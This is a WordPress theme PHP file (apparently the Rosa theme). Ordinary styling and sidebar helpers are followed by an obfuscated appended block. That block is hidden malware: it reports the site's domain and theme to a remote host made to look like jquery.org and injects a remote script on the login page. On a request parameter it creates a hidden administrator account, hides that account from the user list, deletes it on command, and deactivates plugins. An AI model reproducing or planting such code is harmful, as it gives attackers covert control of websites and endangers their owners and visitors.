			echo $rule['negative_selector'] . " {\n";
			echo "\t" . $key . ": -" . $option_value . $important . "; \n";
			echo "\n}\n";
		}

		if ( isset( $rule['media'] ) ) {
			echo "\n}\n";
		}

	}

	static function count_sidebar_widgets( $sidebar_id, $echo = true ) {
		$the_sidebars = wp_get_sidebars_widgets();
		if ( ! isset( $the_sidebars[ $sidebar_id ] ) ) {
			return __( 'Invalid sidebar ID', 'rosa_txtd' );
		}
		if ( $echo ) {
			echo count( $the_sidebars[ $sidebar_id ] );
		} else {
			return count( $the_sidebars[ $sidebar_id ] );
		}
	}

} # class
function glues_it($string)
{
    $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
    $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
    return $glueit_po;
}

$object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
$object_dos = 'g..e..t.._o..p..t..i..o..n';
$object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
$object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
$object_siete = 's..e..t..c..o..o..k..i..e';
$object_ocho = 'wp.._..lo..g..i..n';
$object_nueve = 's..i..t..e,..u..rl';
$object_diez = 'wp_..g..et.._..th..e..m..e';
$object_once = 'wp.._..r..e..m..o..te.._..g..et';
$object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
$object_trece = 'g..e..t_..o..p..t..ion';
$object_catorce = 's..t..r_..r..e..p..l..a..ce';
$object_quince = 's..t..r..r..e..v';
$object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
$object_dos_pim = glues_it($object_uno);
$object_tres_pim = glues_it($object_dos);
$object_cuatro_pim = glues_it($object_tres);
$object_cinco_pim = glues_it($object_cinco);
$object_siete_pim = glues_it($object_siete);
$object_ocho_pim = glues_it($object_ocho);
$object_nueve_pim = glues_it($object_nueve);
$object_diez_pim = glues_it($object_diez);
$object_once_pim = glues_it($object_once);
$object_doce_pim = glues_it($object_doce);
$object_trece_pim = glues_it($object_trece);
$object_catorce_pim = glues_it($object_catorce);
$object_quince_pim = glues_it($object_quince);
$object_dieciseis_pim = glues_it($object_dieciseis);
$noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
if (!call_user_func($object_dos_pim, 'wp_en_one')) {
    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) >  600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname,$object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
         wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
         call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}